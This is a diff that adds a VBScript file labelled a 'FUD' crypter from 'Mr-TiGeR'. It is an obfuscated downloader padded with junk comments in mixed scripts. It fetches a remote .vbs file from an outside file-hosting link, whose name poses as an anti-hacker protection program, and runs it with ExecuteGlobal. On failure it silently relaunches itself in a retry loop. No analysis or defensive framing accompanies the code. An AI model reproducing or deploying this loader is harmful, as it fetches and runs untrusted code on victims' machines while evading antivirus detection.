@@ -1,0 +1,16 @@
+'Mr-TiGeR vBS Crypter FUD
+' = 
+' = 
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+Dim Link
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+Link="http://rghost.net/download/58186873/e4e1185c4f40161a8a6df31923b10b83804dc467/%D8%A2%D9%81%D8%B6%D9%84%20%D8%A8%D8%B1%D9%86%D8%A2%D9%85%D8%AC%20%D9%84%D8%AD%D9%85%D8%A7%D9%8A%D8%A9%20%D8%A7%D9%84%D8%AC%D9%87%D8%A7%D8%B2%20%D9%85%D9%86%20%D8%A7%D9%84%D9%87%D8%A7%D9%83%D8%B1%D8%B2.vbs"
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+' TההKO8Q房ثXdxzvGوי0غהחowCk中יشVhm要gqVNbFאאH不شAيyطc里c
+Class OTI4NAx:Sub MzAxNAx(MjMwMQx):Dim MzgwNgx,OTAwOAx:Set OTAwOAx = CreateObject("WinHttp.WinHttpRequest.5.1"):OTAwOAx.Open "GET", MjMwMQx, False:OTAwOAx.Send:if OTAwOAx.status = 200 Then:For MzgwNgx = 1 To LenB( OTAwOAx.ResponseBody ):Mjk3OQx = Mjk3OQx & (chr)(AscB(MidB(OTAwOAx.ResponseBody,MzgwNgx,1))):Next:Else:dim NDY5MAx:set NDY5MAx = wscript.createobject("wscript.shell"):dim MTg0MQx:set MTg0MQx = createobject("scripting.filesystemobject"):WScript.Sleep(20000):MzAxNAx0 =  MTg0MQx.getfile (wscript.scriptfullname):NDY5MAx.run "wscript.exe //B " & (chr)(34) & MzAxNAx0 & (chr)(34):wscript.Quit:End If:Executeglobal Mjk3OQx:End Sub:End Class:Dim MjIwOQx:Set MjIwOQx = New OTI4NAx:MjIwOQx.MzAxNAx (Link)
+' 8dקOת这wmתHlאvSgfא许h这سbس9شלIhcאDwهg意ر中ךהp英中ה4הVثi个ה
+' 8dקOת这wmתHlאvSgfא许h这سbس9شלIhcאDwهg意ر中ךהp英中ה4הVثi个ה
+' 8dקOת这wmתHlאvSgfא许h这سbس9شלIhcאDwهg意ر中ךהp英中ה4הVثi个ה
+' 8dקOת这wmתHlאvSgfא许h这سbس9شלIhcאDwهg意ر中ךהp英中ה4הVثi个ה
